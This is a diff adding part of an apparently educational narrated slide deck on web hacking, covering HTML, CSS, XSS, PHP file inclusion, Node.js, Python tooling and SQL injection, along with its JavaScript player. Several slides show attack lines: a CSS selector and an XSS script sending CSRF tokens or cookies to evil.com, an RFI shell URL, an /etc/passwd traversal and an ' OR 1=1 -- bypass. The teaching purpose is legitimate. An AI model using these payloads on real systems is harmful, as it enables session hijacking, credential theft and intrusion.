+<li><div class="d"></div><span>Failed sanitization allows injecting malicious markup that <strong>alters page functionality</strong></span></li>
+</ul>
+<div class="code-block"><span class="cm">&lt;!-- Developer left this comment --&gt;</span><br><span class="kw">&lt;input</span> <span class="fn">type</span>=<span class="str">"hidden"</span> <span class="fn">name</span>=<span class="str">"role"</span> <span class="fn">value</span>=<span class="str">"admin"</span><span class="kw">&gt;</span> <span class="cm">&lt;-- Exploitable!</span></div>`},
+
+            {
+                title: "CSS — The Overlooked Weapon", label: "Chapter 05",
+                narr: "CSS is traditionally viewed as a benign design tool, but in offensive security it harbors unique vulnerabilities. Security filters often ignore style sheets while aggressively scanning JavaScript. CSS injection enables clickjacking by placing transparent iframes over legitimate buttons. Advanced techniques leverage attribute selectors to extract CSRF tokens character by character without any JavaScript execution. CSS features like opacity and text-indent bypass Bayesian spam filters.",
+                html: `<ul class="bl">
+<li><div class="d" style="background:var(--cyan)"></div><span>Security filters <strong style="color:var(--cyan)">ignore CSS</strong> while aggressively scanning JavaScript — a blind spot</span></li>
+<li><div class="d" style="background:var(--cyan)"></div><span><strong style="color:var(--red)">Clickjacking</strong>: transparent actionable iframes placed over legitimate buttons</span></li>
+<li><div class="d" style="background:var(--cyan)"></div><span><strong style="color:var(--amber)">Attribute selectors</strong> extract CSRF tokens character-by-character without JavaScript</span></li>
+<li><div class="d" style="background:var(--cyan)"></div><span><strong style="color:var(--red)">Spam evasion</strong>: opacity and text-indent hide text from Bayesian filters</span></li>
+<li><div class="d" style="background:var(--cyan)"></div><span><strong style="color:var(--amber)">@media rule tracking</strong>: detects user interaction patterns silently</span></li>
+</ul>
+<div class="code-block"><span class="kw">input[name="csrf"][value^="a"]</span> { <span class="fn">background</span>: <span class="str">url(https://evil.com/?c=a)</span>; }<br><span class="kw">input[name="csrf"][value^="b"]</span> { <span class="fn">background</span>: <span class="str">url(https://evil.com/?c=b)</span>; }<br><span class="cm">/* Exfiltrates CSRF token one character at a time */</span></div>`},
+
+            {
+                title: "JavaScript & Cross-Site Scripting (XSS)", label: "Chapter 06",
+                narr: "JavaScript is the operational engine of the modern web and the primary vehicle for frontend exploitation. Because it executes directly in the browser, the underlying code is fully exposed. The most devastating vulnerability is Cross-Site Scripting, where untrusted data is included without validation, allowing arbitrary JavaScript execution within the victim's session context.",
+                html: `<ul class="bl">
+<li><div class="d" style="background:var(--red)"></div><span>JavaScript executes <strong style="color:var(--red)">directly in the browser</strong> — code is fully exposed to observation and manipulation</span></li>
+<li><div class="d" style="background:var(--red)"></div><span>XSS occurs when applications include <strong style="color:var(--red)">untrusted data without validation or escaping</strong></span></li>
+<li><div class="d" style="background:var(--red)"></div><span>Successful attacks permit <strong style="color:var(--amber)">session cookie exfiltration</strong>, wallet draining, admin action execution</span></li>
+<li><div class="d" style="background:var(--red)"></div><span>If you don't understand JavaScript, you <strong style="color:var(--red)">cannot bypass modern security filters</strong></span></li>
+</ul>
+<div class="code-block"><span class="cm">// XSS Payload — injected into comment section</span><br><span class="op">&lt;script&gt;</span><span class="fn">document.location</span>=<span class="str">'https://evil.com/steal?c='+document.cookie</span><span class="op">&lt;/script&gt;</span><br><span class="cm">// Silently transmits victim's session cookie to attacker</span></div>`},
+
+            {
+                title: "XSS Attack Types — Reflected, Stored, DOM-Based", label: "Chapter 07",
+                narr: "XSS attacks fall into three categories. Reflected XSS bounces a malicious script off the web server via a crafted URL, executing immediately when the victim clicks the link. Stored XSS is more persistent, injecting the script into the backend database where it lies dormant until a victim views the page. DOM-based XSS manipulates the Document Object Model directly in the browser, exploiting sinks like eval or innerHTML, without the payload ever traveling to the server.",
+                html: `<div class="xss-flow">
+<div class="xs"><div class="xt" style="color:var(--amber)">Reflected XSS</div>Crafted URL<br>bounces off server<br><span style="color:var(--red)">Instant execution</span></div>
+<div class="xa"><i class="fas fa-chevron-right"></i></div>
+<div class="xs"><div class="xt" style="color:var(--red)">Stored XSS</div>Injected into<br>backend database<br><span style="color:var(--red)">Persistent — waits for victims</span></div>
+<div class="xa"><i class="fas fa-chevron-right"></i></div>
+<div class="xs"><div class="xt" style="color:var(--purple)">DOM-Based XSS</div>Manipulates DOM<br>directly in browser<br><span style="color:var(--amber)">Never hits server</span></div>
+</div>
+<div style="margin-top:14px">
+<table class="tbl"><thead><tr><th>Type</th><th>Delivery</th><th>Persistence</th><th>Server Contact</th></tr></thead>
+<tbody>
+<tr><td style="color:var(--amber);font-weight:600">Reflected</td><td>Malicious URL parameter</td><td>None — one-time</td><td>Yes — reflected back</td></tr>
+<tr><td style="color:var(--red);font-weight:600">Stored</td><td>Database injection</td><td style="color:var(--red)">Permanent</td><td>Yes — stored then served</td></tr>
+<tr><td style="color:var(--purple);font-weight:600">DOM-Based</td><td>Client-side source</td><td>Varies by payload</td><td style="color:var(--accent)">No — pure client-side</td></tr>
+</tbody></table></div>`},
+
+            {
+                title: "Frontend Vulnerability Summary", label: "Chapter 08",
+                narr: "Here is a comprehensive summary of frontend security vulnerabilities organized by language. HTML threats include injection and UI redressing. CSS threats include clickjacking, data exfiltration via selectors, and spam filter evasion. JavaScript threats include all three XSS types, DOM manipulation, and session hijacking. Each language in the frontend triad presents distinct and exploitable attack surfaces.",
+                html: `<table class="tbl">
+<thead><tr><th>Language</th><th>Architecture</th><th>Core Vulnerabilities</th></tr></thead>
+<tbody>
+<tr><td style="font-weight:600;color:var(--amber)">HTML</td><td>Structural Markup</td><td>HTML Injection, UI Redressing, Hidden field discovery, Admin form exposure</td></tr>
+<tr><td style="font-weight:600;color:var(--cyan)">CSS</td><td>Visual Styling</td><td>CSS Injection, Data exfiltration via attribute selectors, Clickjacking, Spam evasion</td></tr>
+<tr><td style="font-weight:600;color:var(--red)">JavaScript</td><td>Client-Side Logic</td><td>Cross-Site Scripting (XSS), DOM Manipulation, Session Hijacking, Logic bypass</td></tr>
+</tbody></table>
+<div class="info-box"><i class="fas fa-info-circle"></i><span>Frontend code is always visible to the end user. This inherent transparency is both a developer's debugging tool and a hacker's reconnaissance goldmine.</span></div>`},
+
+            {
+                title: "PHP — Legacy Backend Exploitation", label: "Chapter 09",
+                narr: "PHP powers massive platforms including WordPress, Drupal, and Joomla. Its age creates a vast trail of legacy code with documented security flaws. Local File Inclusion allows reading sensitive server files like wp-config.php by manipulating URL parameters. Remote File Inclusion executes remote malicious payloads, establishing reverse shells. PHP is also historically prime for SQL injection when developers use concatenated query strings instead of prepared statements.",
+                html: `<div class="two-col">
+<div class="cc" style="border-color:var(--amber)"><h4 style="color:var(--amber)">Local File Inclusion (LFI)</h4>
+<div class="code-block" style="font-size:clamp(9px,1vw,11px)"><span class="cm">// Vulnerable PHP code</span><br><span class="kw">include</span>(<span class="str">$_GET['page']</span>);<br><br><span class="cm">// Attack:</span><br><span class="op">?</span>page=<span class="str">../../../../etc/passwd</span></div></div>
+<div class="cc" style="border-color:var(--red)"><h4 style="color:var(--red)">Remote File Inclusion (RFI)</h4>
+<div class="code-block" style="font-size:clamp(9px,1vw,11px)"><span class="cm">// Same vulnerable code</span><br><span class="kw">include</span>(<span class="str">$_GET['page']</span>);<br><br><span class="cm">// Attack:</span><br><span class="op">?</span>page=<span class="str">http://evil.com/shell.php</span></div></div>
+</div>
+<div class="warn-box" style="margin-top:12px"><i class="fas fa-triangle-exclamation"></i><span>Legacy features like <strong>register_globals</strong> allowed attackers to overwrite internal variables via URL parameters. Modern PHP deprecated this, but millions of legacy systems remain vulnerable.</span></div>`},
+
+            {
+                title: "Node.js — Modern Backend Attack Surface", label: "Chapter 10",
+                narr: "Node.js allows JavaScript on the server with an asynchronous, event-driven architecture. It introduces modern vulnerability classes. The NPM ecosystem creates a massive supply chain attack surface where one compromised package can expose millions of applications. Prototype Pollution is uniquely JavaScript — injecting properties into Object.prototype alters all objects application-wide, enabling logic bypasses and remote code execution. Functions like child_process.exec with unsanitized input provide direct shell access.",
+                html: `<ul class="bl">
+<li><div class="d" style="background:var(--purple)"></div><span><strong style="color:var(--purple)">NPM Supply Chain</strong>: one compromised package → millions of downstream applications affected</span></li>
+<li><div class="d" style="background:var(--purple)"></div><span><strong style="color:var(--red)">Prototype Pollution</strong>: injecting into Object.prototype alters ALL objects in the application</span></li>
+<li><div class="d" style="background:var(--purple)"></div><span><strong style="color:var(--amber)">child_process.exec()</strong> with user input = direct bash interpreter access</span></li>
+<li><div class="d" style="background:var(--purple)"></div><span><strong style="color:var(--red)">Insecure deserialization</strong> of JSON can lead to arbitrary code execution</span></li>
+</ul>
+<div class="dep-tree" style="margin-top:10px">
+<div class="dep-node core"><i class="fas fa-cube"></i> Your App</div>
+<div class="dep-line"></div>
+<div class="dep-branch">
+<div style="display:flex;flex-direction:column;align-items:center;gap:3px"><div class="dep-node">express</div><div class="dep-line"></div><div class="dep-node">body-parser</div></div>
+<div style="display:flex;flex-direction:column;align-items:center;gap:3px"><div class="dep-node">lodash</div><div class="dep-line"></div><div class="dep-node bad"><i class="fas fa-skull"></i> malicious-pkg</div></div>
+<div style="display:flex;flex-direction:column;align-items:center;gap:3px"><div class="dep-node">mongoose</div><div class="dep-line"></div><div class="dep-node">bcrypt</div></div>
+</div>
+</div>`},
+
+            {
+                title: "PHP vs Node.js — Backend Comparison", label: "Chapter 11",
+                narr: "PHP and Node.js represent fundamentally different server environments. PHP is synchronous and multi-threaded, processing requests sequentially. It suffers from legacy configuration exploitation and file inclusion vulnerabilities. Node.js is asynchronous and event-driven, suffering from prototype pollution, supply chain attacks through NPM, and server-side JavaScript injection. Understanding both architectures is mandatory for comprehensive backend penetration testing.",
+                html: `<table class="tbl">
+<thead><tr><th>Feature</th><th style="color:var(--amber)">PHP</th><th style="color:var(--purple)">Node.js</th></tr></thead>
+<tbody>
+<tr><td style="color:var(--accent);font-weight:500">Architecture</td><td>Synchronous, multi-threaded</td><td>Asynchronous, event-driven</td></tr>
+<tr><td style="color:var(--accent);font-weight:500">Execution</td><td>Sequential request processing</td><td>Non-blocking I/O event loop</td></tr>
+<tr><td style="color:var(--accent);font-weight:500">Primary Vulns</td><td>LFI/RFI, Command Injection</td><td>Prototype Pollution, SSJI</td></tr>
+<tr><td style="color:var(--accent);font-weight:500">Supply Chain</td><td>Composer packages (moderate)</td><td style="color:var(--red)">NPM ecosystem (massive surface)</td></tr>
+<tr><td style="color:var(--accent);font-weight:500">Legacy Risk</td><td style="color:var(--red)">Very high — decades of old code</td><td>Lower — newer technology</td></tr>
+<tr><td style="color:var(--accent);font-weight:500">RCE Path</td><td>File inclusion → shell upload</td><td>Prototype pollution → exec()</td></tr>
+</tbody></table>`},
+
+            {
+                title: "Python — The Undisputed Automation King", label: "Chapter 12",
+                narr: "Python is the absolute undisputed king of hacking automation and custom tool development. Manual hacking does not scale. A beginner scans one IP with a GUI tool; a professional uses Python to scan thousands autonomously. Python's readable syntax and massive security library ecosystem allow rapid prototyping of custom weapons. From network reconnaissance to web scraping to packet manipulation, Python transforms you from a tool operator into a tool engineer.",
+                html: `<ul class="bl">
+<li><div class="d"></div><span><strong style="color:var(--accent)">Readable syntax</strong> — rapid prototyping of custom tools without boilerplate overhead</span></li>
+<li><div class="d"></div><span><strong style="color:var(--accent)">Massive security ecosystem</strong> — socket, requests, scapy, BeautifulSoup, pynput, hashlib</span></li>
+<li><div class="d"></div><span><strong style="color:var(--amber)">Scales operations</strong> — scan thousands of targets autonomously vs. manual one-at-a-time</span></li>
+<li><div class="d"></div><span><strong style="color:var(--cyan)">Low-level network access</strong> — interface directly with TCP/IP protocols</span></li>
+<li><div class="d"></div><span><strong style="color:var(--red)">Stealth capability</strong> — custom tools bypass signature-based detection</span></li>
+</ul>
+<div class="code-block"><span class="kw">import</span> <span class="fn">socket</span><br><span class="kw">for</span> port <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">1025</span>):<br>&nbsp;&nbsp;s = <span class="fn">socket.socket</span>()<br>&nbsp;&nbsp;<span class="kw">if</span> s.<span class="fn">connect_ex</span>((<span class="str">'target'</span>, port)) == <span class="num">0</span>:<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="fn">print</span>(<span class="str">f'Port {port} OPEN'</span>)</div>`},
+
+            {
+                title: "Python Offensive Libraries — The Arsenal", label: "Chapter 13",
+                narr: "Python's offensive security libraries form a complete arsenal. The socket library builds custom port scanners. The requests library automates HTTP communication for directory brute-forcing and API fuzzing. BeautifulSoup parses HTML to extract hidden form fields and metadata. Scapy provides unparalleled packet manipulation for forging custom TCP/IP packets and evading firewalls. Pynput enables keyloggers, and hashlib monitors file integrity through cryptographic hashing.",
+                html: `<table class="tbl">
+<thead><tr><th>Library</th><th>Application</th><th>Use Case</th></tr></thead>
+<tbody>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">socket</td><td>Network Recon</td><td>Custom port scanners, service identification</td></tr>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">requests</td><td>HTTP Automation</td><td>Directory brute-force, subdomain enumeration, API fuzzing</td></tr>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">BeautifulSoup</td><td>Data Extraction</td><td>Scrape hidden inputs, comments, metadata from pages</td></tr>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">scapy</td><td>Packet Manipulation</td><td>Forge TCP/IP packets, network sniffing, IDS evasion</td></tr>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">pynput</td><td>System Exploitation</td><td>Stealth keyloggers, input monitoring</td></tr>
+<tr><td style="font-family:'Fira Code',monospace;color:var(--accent)">hashlib</td><td>Integrity Monitoring</td><td>SHA-256 file hashing, unauthorized change detection</td></tr>
+</tbody></table>
+<div class="info-box"><i class="fas fa-info-circle"></i><span>Python transitions you from someone who uses other people's software into a hacker who engineers their own sophisticated attack systems.</span></div>`},
+
+            {
+                title: "The Database Vault — SQL Fundamentals", label: "Chapter 14",
+                narr: "Regardless of frontend or backend, the ultimate target of almost all sophisticated attacks is the database. This is where credentials, financial records, and intellectual property reside. Structured Query Language is the universal standard for communicating with relational databases. Because most web applications interact dynamically with databases to serve content and authenticate users, understanding SQL is absolutely mandatory for exploiting and securing data repositories.",
+                html: `<div class="ts" style="align-items:flex-start;text-align:left">
+<div style="font-size:clamp(16px,2.2vw,24px);font-weight:700;color:var(--fg);margin-bottom:14px">The Ultimate Target: The Database</div>
+<ul class="bl">
+<li><div class="d"></div><span>Stores <strong style="color:var(--red)">user credentials, financial records, intellectual property, proprietary data</strong></span></li>
+<li><div class="d"></div><span>SQL is the <strong style="color:var(--accent)">universal language</strong> for relational database communication</span></li>
+<li><div class="d"></div><span>Most headline-making hacks result in <strong style="color:var(--amber)">stolen database contents</strong></span></li>
+<li><div class="d"></div><span>Web apps <strong style="color:var(--cyan)">dynamically query databases</strong> for content, authentication, and transactions</span></li>
+<li><div class="d"></div><span>Understanding SQL = ability to <strong style="color:var(--red)">extract, manipulate, or destroy</strong> this data — or defend it</span></li>
+</ul>
+</div>`},
+
+            {
+                title: "SQL Injection — Breaking the Query", label: "Chapter 15",
+                narr: "SQL Injection occurs when an application incorporates unsanitized user input directly into a database query. The database cannot distinguish between literal data and executable code. Consider a login query selecting users where username and password match. Injecting a single quote breaks out of the data string, followed by OR 1=1 which is always true, and a comment symbol that kills the password check. The database sees the true condition and grants access without a valid password.",
+                html: `<div style="display:flex;flex-direction:column;gap:12px">
+<div class="sql-viz"><span class="cm">-- Normal query:</span><br><span class="safe">SELECT * FROM users WHERE username = '</span><span class="safe">input</span><span class="safe">' AND password = '</span><span class="safe">input</span><span class="safe">'</span></div>
+<div style="text-align:center;color:var(--muted);font-family:'Fira Code',monospace;font-size:12px"><i class="fas fa-arrow-down"></i> Attacker injects: <span style="color:var(--red)">' OR 1=1 --</span></div>
+<div class="sql-viz"><span class="cm">-- Modified query:</span><br><span class="safe">SELECT * FROM users WHERE username = '</span><span class="break">'</span><span class="inject"> OR 1=1 </span><span class="kill">--' AND password = 'input'</span></div>
+<div class="warn-box"><i class="fas fa-unlock"></i><span><strong>Result:</strong> The password check is commented out. <code>1=1</code> is always true. Database returns all users — attacker is authenticated as admin without knowing the password.</span></div>
+</div>`},
+
+            {
+                title: "SQL Injection Attack Types", label: "Chapter 16",
+                narr: "SQL injection is categorized by execution mechanics. In-band SQLi uses the same channel for attack and data retrieval, including Error-based which reveals schema through verbose errors, and UNION-based which appends malicious SELECT statements to dump entire tables directly to the frontend. Blind SQLi occurs when the application doesn't return errors or data directly. Boolean-based blind SQLi infers data through true-false response differences. Time-based blind SQLi measures server latency when conditional delays are injected.",
+                html: `<table class="tbl">
+<thead><tr><th>Category</th><th>Mechanism</th><th>Impact</th></tr></thead>
+<tbody>
+<tr><td style="color:var(--amber);font-weight:600">In-Band (Error)</td><td>Intentional syntax violation</td><td>Verbose errors reveal schema, version, table names</td></tr>
+<tr><td style="color:var(--red);font-weight:600">In-Band (UNION)</td><td>Appends secondary SELECT</td><td style="color:var(--red)">Dumps entire tables to frontend</td></tr>
+<tr><td style="color:var(--cyan);font-weight:600">Blind (Boolean)</td><td>True/False conditions</td><td>Infers data bit-by-bit via response differences</td></tr>
+<tr><td style="color:var(--purple);font-weight:600">Blind (Time)</td><td>Conditional delays (WAITFOR)</td><td>Infers data by measuring response latency in seconds</td></tr>
+</tbody></table>
+<div class="info-box"><i class="fas fa-clock"></i><span>Time-based blind SQLi is the slowest method but works when applications handle all errors gracefully and show no visible output differences.</span></div>`},
+
+            {
+                title: "Defense — Parameterized Queries", label: "Chapter 17",
+                narr: "The definitive defense against all forms of SQL injection is parameterized queries, also called prepared statements. Instead of concatenating raw strings, the developer defines the SQL structure with placeholders. User input is then bound to these placeholders and treated strictly as literal data by the database parser. This completely neutralizes the ability of input to break out of the string context. While Web Application Firewalls offer additional defense-in-depth, they are frequently bypassed by encoding techniques. Parameterized queries remain the only robust solution.",
+                html: `<div style="display:flex;flex-direction:column;gap:12px">
+<div style="background:rgba(255,82,82,0.06);border:1px solid rgba(255,82,82,0.15);border-radius:8px;padding:12px 16px">
+<div style="color:var(--red);font-weight:600;font-size:12px;margin-bottom:6px;font-family:'Fira Code',monospace"><i class="fas fa-xmark"></i> VULNERABLE — String Concatenation</div>
+<div class="code-block" style="border:none;padding:0;background:transparent"><span class="kw">query</span> = <span class="str">"SELECT * FROM users WHERE name = '"</span> + <span class="fn">user_input</span> + <span class="str">"'"</span></div></div>
+<div style="text-align:center;color:var(--accent);font-size:18px"><i class="fas fa-arrow-down"></i></div>
+<div style="background:rgba(0,230,118,0.06);border:1px solid rgba(0,230,118,0.15);border-radius:8px;padding:12px 16px">
+<div style="color:var(--accent);font-weight:600;font-size:12px;margin-bottom:6px;font-family:'Fira Code',monospace"><i class="fas fa-check"></i> SECURE — Parameterized Query</div>
+<div class="code-block" style="border:none;padding:0;background:transparent"><span class="kw">query</span> = <span class="str">"SELECT * FROM users WHERE name = ?"</span><br><span class="fn">db.execute</span>(query, [<span class="fn">user_input</span>]) <span class="cm"># Input = literal data only</span></div></div>
+</div>
+<div class="fix-box"><i class="fas fa-shield-halved"></i><span>Parameterized queries structurally guarantee that user input can NEVER be interpreted as executable SQL code, regardless of encoding, escaping, or WAF bypass techniques.</span></div>`},
+
+            {
+                title: "Conclusion — Read the Code, Break the Code", label: "Conclusion",
+                narr: "To summarize: you do not need to be a master software engineer, but the fundamentals are non-negotiable. Understand the web frontend to find structural entry points. Understand backend logic like PHP and Node.js to exploit server flaws. Learn Python to automate attacks and build custom tools. Deeply understand SQL because the database is always the ultimate prize. If you learn to read the code, you will inevitably learn how to break the code. Stay curious, stay ethical, and keep hacking.",
+                html: `<div class="ts" style="text-align:left;align-items:flex-start">
+<div style="font-size:clamp(17px,2.4vw,26px);font-weight:700;color:var(--fg);margin-bottom:14px;line-height:1.3">Read the Code. Break the Code.</div>
+<ul class="bl">
+<li><div class="d" style="background:var(--amber)"></div><span><strong style="color:var(--amber)">Frontend mastery</strong> — find structural entry points in HTML, exploit CSS blind spots, weaponize JavaScript via XSS</span></li>
+<li><div class="d" style="background:var(--purple)"></div><span><strong style="color:var(--purple)">Backend comprehension</strong> — exploit PHP file inclusions, attack Node.js prototype pollution and supply chains</span></li>
+<li><div class="d" style="background:var(--accent)"></div><span><strong style="color:var(--accent)">Python automation</strong> — build custom scanners, brute-forcers, packet forgers, and keyloggers from scratch</span></li>
+<li><div class="d" style="background:var(--red)"></div><span><strong style="color:var(--red)">SQL fluency</strong> — the database is always the ultimate prize; understand injection to exploit and defend</span></li>
+</ul>
+<div style="margin-top:18px;padding:14px 18px;background:rgba(0,230,118,0.05);border:1px solid rgba(0,230,118,0.12);border-radius:8px;font-family:'Fira Code',monospace;font-size:clamp(11px,1.2vw,14px);color:var(--accent);line-height:1.6">
+"If you learn to read the code,<br>you will inevitably learn how to break the code."
+</div>
+</div>`}
+        ];
+
+        // State
+        const st = { cur: 0, play: false, up: false, spd: 1, vol: 1, mut: false, start: false, ss: 0, se: 0, pt: null, utt: null };
+        S.forEach(s => { s.w = s.narr.split(/\s+/).length; s.dur = (s.w / 145) * 60 });
+        const totD = S.reduce((a, s) => a + s.dur, 0);
+
+        const $ = id => document.getElementById(id);
+        const sa = $('sa'), plb = $('plb'), pli = $('pli'), pvb = $('pvb'), nxb = $('nxb'), pw2 = $('pw2'), pf = $('pf'), td = $('td'), ss = $('ss'), vsl = $('vsl'), vb = $('vb'), vi = $('vi'), ct = $('ct'), cp = $('cp'), cl = $('cl'), iov = $('iov'), eov = $('eov'), sbtn = $('sbtn'), rbtn = $('rbtn'), si = $('si'), tt = $('tt'), tst = $('tst');
+
+        function fmt(s) { const m = Math.floor(s / 60).toString().padStart(2, '0'), sc = Math.floor(s % 60).toString().padStart(2, '0'); return m + ':' + sc }
+        function toast(m) { tst.textContent = m; tst.classList.add('show'); setTimeout(() => tst.classList.remove('show'), 2200) }
+        function getEl() { let t = 0; for (let i = 0; i < st.cur; i++)t += S[i].dur; t += st.se; return t }
+
+        function buildSlides() {
+            sa.innerHTML = '';
+            S.forEach((s, i) => {
+                const d = document.createElement('div');
+                d.className = 'slide' + (i === 0 ? ' active' : '');
+                d.id = 'sl-' + i;
+                d.innerHTML = `<div class="sl">${s.label}</div><div class="st">${s.title}</div><div class="sb">${s.html}</div>`;
+                sa.appendChild(d);
+            });
+        }
+
+        function buildChaps() {
+            cl.innerHTML = '';
+            S.forEach((s, i) => {
+                const d = document.createElement('div');
+                d.className = 'ch-item' + (i === 0 ? ' active' : '');
+                d.innerHTML = `<span class="n">${i + 1}</span><span class="label">${s.title}</span>`;
+                d.addEventListener('click', () => seekTo(i));
+                cl.appendChild(d);
+            });
+        }
+
+        function renderSlide(idx, dir = 'next') {
+            const prev = sa.querySelector('.slide.active'), next = $('sl-' + idx);
+            if (!next || prev === next) return;
+            if (prev) { prev.classList.remove('active'); prev.classList.add(dir === 'next' ? 'exit' : ''); setTimeout(() => prev.classList.remove('exit'), 500) }
+            next.classList.add('active');
+            next.querySelectorAll('.bl li').forEach((li, i) => { li.style.animation = 'none'; li.offsetHeight; li.style.animationDelay = (i * .1) + 's'; li.style.animation = '' });
+            cl.querySelectorAll('.ch-item').forEach((e, i) => e.classList.toggle('active', i === idx));
+            tt.textContent = S[idx].title;
+            st.se = 0; updProg();
+        }
+
+        function speak(text) {
+            if (!('speechSynthesis' in window)) { toast('Text-to-speech not supported'); return }
+            speechSynthesis.cancel();
+            const u = new SpeechSynthesisUtterance(text);
+            u.rate = st.spd; u.pitch = 1; u.volume = st.mut ? 0 : st.vol;
+            const v = speechSynthesis.getVoices();
+            const p = v.find(x => x.lang.startsWith('en') && x.name.includes('Google')) || v.find(x => x.lang.startsWith('en') && x.localService) || v.find(x => x.lang.startsWith('en'));
+            if (p) u.voice = p;
+            u.onend = () => { if (!st.up && st.play) { if (st.cur < S.length - 1) nextSlide(); else { stopPlay(); eov.classList.add('vis') } } si.classList.remove('vis') };
+            u.onerror = e => { if (e.error !== 'canceled') si.classList.remove('vis') };
+            st.utt = u; speechSynthesis.speak(u); si.classList.add('vis');
+        }
+
+        function doPlay() { st.play = true; st.up = false; st.ss = Date.now() - (st.se * 1000); pli.className = 'fas fa-pause'; speak(S[st.cur].narr); startPT() }
+        function doPause() { st.up = true; st.play = false; st.se = (Date.now() - st.ss) / 1000; pli.className = 'fas fa-play'; speechSynthesis.pause(); si.classList.remove('vis'); stopPT() }
+        function togglePlay() { if (!st.start) return; st.play ? doPause() : doPlay() }
+
+        function nextSlide() { if (st.cur >= S.length - 1) return; speechSynthesis.cancel(); st.cur++; renderSlide(st.cur, 'next'); if (st.play) { st.ss = Date.now(); st.se = 0; speak(S[st.cur].narr) } else updProg() }
+        function prevSlide() { if (st.cur <= 0) return; speechSynthesis.cancel(); si.classList.remove('vis'); const w = st.play; st.play = false; st.cur--; st.se = 0; renderSlide(st.cur, 'prev'); updProg(); if (w) setTimeout(() => doPlay(), 100) }
+
+        function seekTo(idx) {
+            if (idx === st.cur) return; speechSynthesis.cancel(); si.classList.remove('vis');
+            const w = st.play; st.play = false; st.cur = idx; st.se = 0; renderSlide(idx); updProg();
+            if (w) setTimeout(() => doPlay(), 100);
+        }
+
+        function stopPlay() { st.play = false; st.up = false; pli.className = 'fas fa-play'; speechSynthesis.cancel(); si.classList.remove('vis'); stopPT() }
+        function startPT() { stopPT(); st.pt = setInterval(() => { st.se = (Date.now() - st.ss) / 1000; updProg() }, 200) }
+        function stopPT() { if (st.pt) { clearInterval(st.pt); st.pt = null } }
+        function updProg() { const e = getEl(), p = Math.min((e / totD) * 100, 100); pf.style.width = p + '%'; td.textContent = fmt(e) + ' / ' + fmt(totD) }
+
+        plb.addEventListener('click', togglePlay);
+        pvb.addEventListener('click', prevSlide);
+        nxb.addEventListener('click', nextSlide);
+        ss.addEventListener('change', () => { st.spd = parseFloat(ss.value); if (st.play) { st.ss = Date.now() - (st.se * 1000); speak(S[st.cur].narr) } toast('Speed: ' + ss.value + 'x') });
+        vsl.addEventListener('input', () => { st.vol = parseFloat(vsl.value); st.mut = false; vi.className = st.vol === 0 ? 'fas fa-volume-xmark' : st.vol < .5 ? 'fas fa-volume-low' : 'fas fa-volume-high'; if (st.utt) st.utt.volume = st.vol });
+        vb.addEventListener('click', () => { st.mut = !st.mut; vi.className = st.mut ? 'fas fa-volume-xmark' : 'fas fa-volume-high'; if (st.utt) st.utt.volume = st.mut ? 0 : st.vol });
+        ct.addEventListener('click', () => { cp.classList.toggle('open'); ct.classList.toggle('active') });
+        pw2.addEventListener('click', e => { const r = pw2.getBoundingClientRect(), p = (e.clientX - r.left) / r.width, tt2 = p * totD; let a = 0; for (let i = 0; i < S.length; i++) { if (a + S[i].dur >= tt2) { seekTo(i); const w = tt2 - a; st.se = w; st.ss = Date.now() - (w * 1000); updProg(); break } a += S[i].dur } });
+        sbtn.addEventListener('click', () => { st.start = true; iov.classList.add('hidden'); if (speechSynthesis.getVoices().length === 0) { speechSynthesis.addEventListener('voiceschanged', () => doPlay(), { once: true }) } else doPlay() });
+        rbtn.addEventListener('click', () => { eov.classList.remove('vis'); st.cur = 0; st.se = 0; renderSlide(0, 'prev'); updProg(); setTimeout(() => doPlay(), 300) });
+
+        document.addEventListener('keydown', e => {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+            switch (e.code) {
+                case 'Space': e.preventDefault(); if (!st.start) { sbtn.click(); return } togglePlay(); break;
+                case 'ArrowRight': e.preventDefault(); nextSlide(); break;
+                case 'ArrowLeft': e.preventDefault(); prevSlide(); break;
+                case 'ArrowUp': e.preventDefault(); st.spd = Math.min(st.spd + .25, 2); ss.value = st.spd.toString(); if (st.play) { st.ss = Date.now() - (st.se * 1000); speak(S[st.cur].narr) } toast('Speed: ' + st.spd + 'x'); break;
+                case 'ArrowDown': e.preventDefault(); st.spd = Math.max(st.spd - .25, .5); ss.value = st.spd.toString(); if (st.play) { st.ss = Date.now() - (st.se * 1000); speak(S[st.cur].narr) } toast('Speed: ' + st.spd + 'x'); break;
+                case 'KeyM': vb.click(); break;
+                case 'KeyF': if (document.fullscreenElement) document.exitFullscreen(); else $('pl').requestFullscreen?.(); break;
+                case 'Escape': cp.classList.remove('open'); ct.classList.remove('active'); break;
+            }
+        });
+
+        document.addEventListener('visibilitychange', () => { if (document.hidden && st.play) doPause() });
+        if ('speechSynthesis' in window) { speechSynthesis.getVoices(); speechSynthesis.addEventListener('voiceschanged', () => speechSynthesis.getVoices(), { once: true }) }
+
+        buildSlides(); buildChaps(); updProg();
+    </script>
+</body>
+
+</html>
